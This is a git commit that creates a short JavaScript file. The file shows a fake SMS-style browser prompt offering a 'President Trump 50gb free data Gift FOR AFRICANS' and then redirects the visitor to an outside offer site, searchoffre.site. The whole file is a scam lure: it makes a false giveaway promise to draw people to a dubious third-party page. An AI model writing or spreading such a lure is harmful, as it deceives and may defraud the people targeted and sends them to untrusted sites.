e79d1506f7cb72d6e9dad62890cb331b4d5b3c8f
bigetijazz8 <bigetijazz8@gmail.com>
2024-11-06 21:49:04 -0800

    Create donaldtrump.js

---
+++ donaldtrump.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM 50GB'
+password=prompt('SMS: Hello, You are qualify for President Trump 50gb free data Gift FOR AFRICANS, Kindly Press OK to claim now','CLAIM 50GB');
+if (password != 'CLAIM 50GB') {
+location.href='https://www.searchoffre.site/50gb-offer.html';
+}
